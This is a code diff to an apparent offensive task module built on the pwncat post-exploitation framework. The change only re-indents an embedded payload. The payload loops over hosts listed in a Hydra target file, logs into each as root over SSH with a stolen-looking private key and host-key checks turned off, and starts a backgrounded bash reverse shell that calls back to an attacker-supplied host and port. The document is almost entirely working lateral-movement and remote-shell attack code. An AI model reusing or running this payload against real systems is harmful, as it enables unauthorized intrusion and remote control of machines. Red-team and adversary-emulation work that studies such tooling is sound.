@@ -117,12 +117,12 @@ def execute(session: pwncat.manager.Session, task):
             # and enumerate? but for now we will have to _cheat_ a little
 
             payload = base64.b64encode(f'''
-                            for h in $(cat /tmp/hydra-targets.txt | grep -v $(ip -o -f inet addr show | awk \'/scope global/ {{print $4}}\' | head -1 | awk -F \'/\' \'{{ print $1 }}\')); do 
-                                echo "connecting to: $h..."
-                                ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i ~/.ssh/secret_key root@$h "nohup /bin/bash -c 'TASK=scan2kubeshell /bin/bash -i >& /dev/tcp/{args.reverse_shell_host}/{args.reverse_shell_port} 0>&1' >/dev/null 2>&1 &"
-                                echo "result: $?"
-                                echo "connection complete."
-                            done'''.encode("utf-8"))
+for h in $(cat /tmp/hydra-targets.txt | grep -v $(ip -o -f inet addr show | awk \'/scope global/ {{print $4}}\' | head -1 | awk -F \'/\' \'{{ print $1 }}\')); do 
+    echo "connecting to: $h..."
+    ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i ~/.ssh/secret_key root@$h "nohup /bin/bash -c 'TASK=scan2kubeshell /bin/bash -i >& /dev/tcp/{args.reverse_shell_host}/{args.reverse_shell_port} 0>&1' >/dev/null 2>&1 &"
+    echo "result: $?"
+    echo "connection complete."
+done'''.encode("utf-8"))
             session.log(
                 f"starting reverse shell hand off on remote host off via ssh: {payload}")
             result = session.platform.run(
